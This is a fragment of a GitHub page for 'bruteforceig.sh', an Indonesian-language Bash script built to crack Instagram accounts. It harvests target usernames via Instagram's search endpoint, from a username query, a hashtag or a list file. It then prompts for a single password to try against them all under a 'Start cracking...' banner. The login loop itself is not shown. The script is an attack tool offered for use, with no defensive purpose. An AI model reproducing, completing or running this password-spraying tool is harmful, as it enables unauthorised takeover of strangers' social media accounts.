...
bf_ig/bruteforceig.sh
@venom707 venom707 Update bruteforceig.sh
2127637 17 hours ago
127 lines (115 sloc)  5.01 KB
...
|  _ < | ||  _/ ___ \| |\  |  Gans
|_| \_\___|_|/_/   \_\_| \_|
\e[1;31mcontact: https://wa.me/6285714916568\e[1;37m
'''
...
#menu
echo -e '''
1]. Mau Lewat \e[1;31m@username\e[1;37m
2]. Atau lewat \e[1;31m#hashtag\e[1;37m
3]. Atau lu pake list target
'''

read -p $'Lu pilih yang mana  : \e[1;33m' opt

touch target

case $opt in
    1) #menu 1
        read -p $'\e[37m[\e[34m?\e[37m] Username Ig    : \e[1;33m' ask
        collect=$(curl -s "https://www.instagram.com/web/search/topsearch/?context=blended&query=${ask}" | jq -r '.users[].user.username' > target)
        echo $'\e[37m[\e[34m+\e[37m] Pengguna username tersebut     : \e[1;33m'$collect''$(< target wc -l ; echo -e "${white}user")
        read -p $'[\e[1;34m?\e[1;37m] Password yg ingin digunakan  : \e[1;33m' pass
        echo -e "${white}[${yellow}!${white}] ${red}Start cracking...${white}"
        ;;
    2) #menu 2
        read -p $'\e[37m[\e[34m?\e[37m] Tag yang pengen lu pake : \e[1;33m' hashtag
        ...
        ;;
    3) #menu 3
        read -p $'\e[37m[\e[34m?\e[37m] Input list lu  : \e[1;33m' list
        if [[ ! -e $list ]]; then
            ...
            exit
                ...
                read -p $'[\e[34m?\e[37m] Password yg pengen dicoba  : \e[1;33m' pass
                echo -e "${white}[${yellow}!${white}] ${red}Start cracking...${white}"
        fi
        ;;
    *) #wrong menu
